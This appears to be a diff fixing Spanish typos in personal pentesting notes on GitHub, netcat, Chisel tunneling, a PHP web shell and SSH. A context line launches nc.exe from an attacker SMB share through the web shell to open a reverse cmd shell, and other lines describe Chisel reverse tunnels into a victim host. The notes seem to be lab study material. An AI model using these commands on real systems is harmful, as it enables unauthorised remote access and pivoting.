@@ -2,21 +2,21 @@
 # ¿Qué es GitHub?
 
 Github es un portal creado para alojar el código de las aplicaciones de cualquier desarrollador, y que fue comprada por Microsoft en junio del 2018.
-La plataforma está creada para que los desarrolladores suban el código de sus aplicaciones y herramientas, y que como usuario no sólo puedas
+La plataforma está creada para que los desarrolladores suban el código de sus aplicaciones y herramientas, y que como usuario no solo puedas
 descargarte la aplicación, sino también entrar a su perfil para leer sobre ella o colaborar con su desarrollo.
 
 Git se utiliza también como sistemas de control, ya que permite comparar el código de un archivo para ver las diferencias entre las versiones, restaurar versiones
 antiguas si algo sale mal, y fusionar los cambios de distintas versiones. También permite trabajar con distintas ramas de un proyecto, como la de desarrollo
 para meter nuevas funciones al programa o la de producción para depurar los bugs.
 
-Github permite que los desarrolladores alojen proyectos creando repositorios de forma gratuita. Pero hay que tener una cosa en mente, y es que para poder subir gratis
+Github permite que los desarrolladores alojen proyectos generando repositorios de forma gratuita. Pero hay que tener una cosa en mente, y es que para poder subir gratis
 los proyectos deberán ser de código abierto. Y no quieres que tu aplicación sea de código abierto, la plataforma también tiene una versión de pago para alojar proyectos
 de forma privada.
 
 
 # rlwrap nc
 
-Como añardir rlwrap a netcat para aplicar una shell interactiva.
+Como añadir rlwrap a netcat para aplicar una shell interactiva.
 
 
 
@@ -37,7 +37,7 @@ También podemos indicar una ruta personalizada si así lo deseamos:
  
     net user > “ruta\archivo.txt
     
-### Ver información detallada de un Usuaerio
+### Ver información detallada de un Usuario
 
 Para obtener información mucho más detallada de un usuario del sistema, podemos ejecutar lo siguiente. Allí
 vemos información precisa y completa sobre el usuario seleccionado.
@@ -55,30 +55,30 @@ Para cambiar el nombre de archivo2.txt por archivo3.txt, se puede usar el comand
 
 ##¿Qué es Chisel?
 
-``Chisel es un túnel TCP/UDP rápido, transportado a través des servicio HTTP y protegido a través de SSH``. Esta escrito en Go  y utiliza el
+``Chisel es un túnel TCP/UDP rápido, transportado a través del servicio HTTP y protegido a través de SSH``. Está escrito en Go y utiliza el
 protocolo de ``cliente`` a ``servidor``.  Chisel es principalmente útil para pasar a través de firewalls, aunque también se puede usar para 
 proporcionar un punto final seguro en su red.
 
 ## Redireccionar puertos con Chisel a nuestra localhost:
 
-Una vez hemos ganado acceso o tenemos la posibilidad de subir archivos y ejecutar comandos en el dispoditivo víctima, podemos crear un tunel
-con ``chisel``. Mediante esta herramienta podremos establecer una conexión de ``cliente`` a ``servidor`` y conectar dos puertos entre si.
-Básicamente conectamos un puerto de la máquina víctima con uno de nuestro equipo, de tal forma, que podemos ejecutar cualquier herramienta en 
-local utilizando ese puerto, y automaticamente se redireccionara el ataque a la maquina victima.
+Una vez hemos ganado acceso o tenemos la posibilidad de subir archivos y ejecutar comandos en el dispositivo víctima, podemos crear un túnel
+con ``chisel``. Mediante esta herramienta podremos establecer una conexión de ``cliente`` a ``servidor`` y conectar dos puertos entre sí.
+Básicamente, conectamos un puerto de la máquina víctima con uno de nuestro equipo, de tal forma, que podemos ejecutar cualquier herramienta en 
+local usando ese puerto, y automáticamente se redireccionara el ataque a la máquina víctima.
 
 ### Establecer conexión por parte del Servidor (Linux):
 
-En primer lugar, debemos de estabecer ``Chisel`` en modo ``Servidor`` en nuestro sistema Linux, para ello debemos de asegurarnos que la versión de
+En primer lugar, debemos de establecer ``Chisel`` en modo ``Servidor`` en nuestro sistema Linux, para ello debemos de asegurarnos que la versión de
 Chisel instalada es la adecuada para nuestra distribución. Para establecer nuestro sistema como servidor simplemente ejecutamos el siguiente comando
-especificando el puerto que por el que vamos a establecer la conexión. Es importante que este puerto no se encutre en us.
+especificando el puerto que por el que vamos a establecer la conexión. Es importante que este puerto no se encuentre en us.
 
-    chisel serve --reverse --port [Puerto Local Conexión] 
+    chisel server --reverse --port [Puerto Local Conexión] 
     
-    ./chisel serve --reverse -p [Puerto Local Conexión] 
+    ./chisel server --reverse -p [Puerto Local Conexión] 
 
 ``Ejemplo``
 
-    chisel serve --reverse -p 8081
+    chisel server --reverse -p 8081
 
 Aquí podemos ver como en el ejemplo hemos establecido un servicio de servidor con Chisel por el puerto 8081, este puerto es el que posteriormente
 tendremos que especificar en el servicio por parte del Cliente para realizar la conexión.
@@ -86,9 +86,9 @@ tendremos que especificar en el servicio por parte del Cliente para realizar la 
 
 ### Establecer conexión por parte del Cliente (Windows):
 
-Para establecer Chisel en un sistema Windows como ``Cliente``, nos descargamos la versión especifica para Windows (debemos de comprobar 
-si el sistema es de 32 o 64 bits) y ejecutamos el siguiente comando. En el debemos especificar el puerto por el que vamos a comunicarnos 
-con nuestro servicio ``Servidor`` y los puestos que vamos a comunicar entre si:
+Para establecer Chisel en un sistema Windows como ``Cliente``, nos descargamos la versión específica para Windows (debemos de comprobar 
+si el sistema es de 32 o 64 bits) y ejecutamos el siguiente comando. En él debemos especificar el puerto por el que vamos a comunicarnos 
+con nuestro servicio ``Servidor`` y los puestos que vamos a comunicar entre sí:
 
 
     .\chisel.exe client [Ip Local]:[Puerto de Conexión] R:[Puerto Víctima]:127.0.0.1:[Puerto Local]
@@ -124,7 +124,7 @@ Mostrar con dir los recursos compartidos:
     http://10.10.10.198:8080/upload/kamehameha.php?telepathy=dir \\10.10.14.75\smbFolder\
     
 
-Ejecutar nc.exe a través del navegador, tendremos que especificar una direccion y un puerto de escucha:
+Ejecutar nc.exe a través del navegador, tendremos que especificar una dirección y un puerto de escucha:
 
     http://10.10.10.198:8080/upload/kamehameha.php?telepathy=\\10.10.14.75\smbFolder\nc.exe -e cmd [Ip Atacante] [Puerto en Escucha]
     
@@ -139,13 +139,13 @@ Ejecutar nc.exe a través del navegador, tendremos que especificar una direccion
 
 La comunicación inalámbrica o por cable entre dos máquinas se realiza a través de puertos. Hay un total de 65,536 puertos de comunicación y la 
 comunicación puede tener lugar a través de cualquiera de estos puertos. SSH se comunica por defecto a través del puerto 22. Cuando ejecutamos el 
-comando anterior, la conexión entre el cliente local y el servidor se establece a través del puerto 22 y toda la comunicación se realiza a través 
+comando anterior, la conexión entre el cliente local y el servidor se establece a través del puerto 22 y toda la comunicación se ejecuta a través 
 de este puerto.
 
 ## Especificar puerto de conexión con SSH
 
-En ocaciones, ``se puede modificar el puerto por el cual se conecta SSH``. En caso de no especificar ningún puerto SSH se conectará por defecto por
-el puerto 22. En caso de querer especificar otro puerto lo podemo hacer con la opción ``-p`` seguido del puerto en cuestion.
+En ocasiones, ``se puede modificar el puerto por el cual se conecta SSH``. En caso de no especificar ningún puerto, SSH se conectará por defecto por
+el puerto 22. En caso de querer especificar otro puerto lo podemos hacer con la opción ``-p`` seguido del puerto en cuestión.
 
 
     ssh [Usuario]@[Dirección] -p [Puerto]
@@ -157,20 +157,20 @@ La utilidad sshpass está diseñada para ejecutar SSH utilizando el modo de aute
 con el teclado, pero de una manera no interactiva. De esta forma podemos especificar en la misma línea de comandos
 la contraseña antes de ejecutar el comando SSH. La contraseña debe establecerse entre comillas dobles:
 
-    sshpass -p ["Contraseña"] ssh [Usurio]@[Dirección] -p [Puerto] 
+    sshpass -p ["Contraseña"] ssh [Usuario]@[Dirección] -p [Puerto] 
     
     
 # Ejemplo de conexión SSH:
 
-Para realizar un ejemplo de como conectarno a otro equipo utilizando SSH vamos a utilizar la web ``https://overthewire.org``. Está página está 
-enfocada en enseñar los parámetros básicos de Linux y SSH a través de distintos laboratorios. A estos laboratorios nos conetaremos a través de
-SSH y la finalidad de cada practica es encontrar la flag secreta oculta en cada sistema. La flag encontrada es la contraseña para poder conectarnos
+Para realizar un ejemplo de como conectarnos a otro equipo empleando SSH vamos a utilizar la web ``https://overthewire.org``. Esta página está 
+enfocada en enseñar los parámetros básicos de Linux y SSH a través de distintos laboratorios. A estos laboratorios nos conectaremos a través de
+SSH y la finalidad de cada práctica es encontrar la flag secreta oculta en cada sistema. La flag encontrada es la contraseña para poder conectarnos
 al siguiente nivel. 
 
-En este ejemplo únicamente mostraremos como conectarnos a través de SSH, para ver todas practicas de ``OverTheWire`` podeís encontrarlas en la 
+En este ejemplo únicamente mostraremos como conectarnos a través de SSH, para ver todas prácticas de ``Over The Wire`` podéis encontrarlas en la 
 sección de Laboratorios.
 
-En primer lugar abrimos la página oficial de Over The Wire:
+En primer lugar, abrimos la página oficial de Over The Wire:
 
 ![Captura de pantalla 2022-10-12 220427](https://user-images.githubusercontent.com/103068924/195438160-e7db9a69-f9d1-4ee9-b8dd-a494988ad836.png)
 
@@ -183,7 +183,7 @@ y nos indica que debemos utilizar el ``puerto 2220``:
 
     ssh bandit0@bandit.labs.overthewire.org -p 2220 
     
-Una vez ejeuctado el comando anterior, nos pedirá la contraseña, la introducimos y ya tendremos acceso al 
+Una vez ejecutado el comando anterior, nos pedirá la contraseña, la introducimos y ya tendremos acceso al 
 otro equipo:
 
 ![Captura de pantalla 2022-10-12 221350](https://user-images.githubusercontent.com/103068924/195438782-444534be-f275-4742-a489-8f93d475accf.png)
